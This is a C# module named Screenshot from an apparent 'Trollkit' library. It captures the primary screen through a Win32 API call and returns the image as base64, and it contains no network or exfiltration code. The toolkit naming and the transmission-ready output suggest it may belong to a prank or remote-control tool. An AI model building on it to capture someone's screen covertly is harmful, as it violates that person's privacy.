using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Trollkit_Library.Modules
{
	public class Screenshot
	{
		private const int ENUM_CURRENT_SETTINGS = -1;

		[DllImport("user32.dll")]
		public static extern bool EnumDisplaySettings(string lpszDeviceName, int iModeNum, ref DEVMODE lpDevMode);


		private Screenshot() { }

		public static string MakeScreenshot()
		{
			Screen screen = Screen.PrimaryScreen;

			DEVMODE dm = new DEVMODE();
			dm.dmSize = (short)Marshal.SizeOf(typeof(DEVMODE));
			EnumDisplaySettings(screen.DeviceName, ENUM_CURRENT_SETTINGS, ref dm);
			using (Bitmap bmp = new Bitmap(dm.dmPelsWidth, dm.dmPelsHeight))
			using (Graphics g = Graphics.FromImage(bmp))
			{
				g.CopyFromScreen(dm.dmPositionX, dm.dmPositionY, 0, 0, bmp.Size);

				byte[] imageArray = bmp.ToByteArray(ImageFormat.Bmp);
				return Convert.ToBase64String(imageArray);
			}
		}

		public static int GetScreenCount()
		{
			return Screen.AllScreens.Length;
		}


		[StructLayout(LayoutKind.Sequential)]
		public struct DEVMODE
		{
			private const int CCHDEVICENAME = 0x20;
			private const int CCHFORMNAME = 0x20;
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 0x20)]
			public string dmDeviceName;
			public short dmSpecVersion;
			public short dmDriverVersion;
			public short dmSize;
			public short dmDriverExtra;
			public int dmFields;
			public int dmPositionX;
			public int dmPositionY;
			public ScreenOrientation dmDisplayOrientation;
			public int dmDisplayFixedOutput;
			public short dmColor;
			public short dmDuplex;
			public short dmYResolution;
			public short dmTTOption;
			public short dmCollate;
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 0x20)]
			public string dmFormName;
			public short dmLogPixels;
			public int dmBitsPerPel;
			public int dmPelsWidth;
			public int dmPelsHeight;
			public int dmDisplayFlags;
			public int dmDisplayFrequency;
			public int dmICMMethod;
			public int dmICMIntent;
			public int dmMediaType;
			public int dmDitherType;
			public int dmReserved1;
			public int dmReserved2;
			public int dmPanningWidth;
			public int dmPanningHeight;
		}
	}
}
